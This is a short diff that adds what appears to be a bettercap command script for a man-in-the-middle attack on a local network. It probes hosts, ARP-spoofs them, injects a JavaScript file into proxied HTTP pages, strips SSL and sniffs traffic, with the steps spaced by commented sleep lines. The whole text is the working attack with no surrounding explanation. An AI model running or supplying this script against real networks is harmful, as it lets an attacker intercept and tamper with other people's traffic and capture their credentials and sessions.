@@ -1,0 +1,10 @@
+net.probe on
+#sleep 20
+net.show
+arp.spoof on 
+#sleep 10
+set http.proxy.injectjs script.js
+set http.proxy.sslstrip true
+net.sniff on
+#sleep 30
+http.proxy on
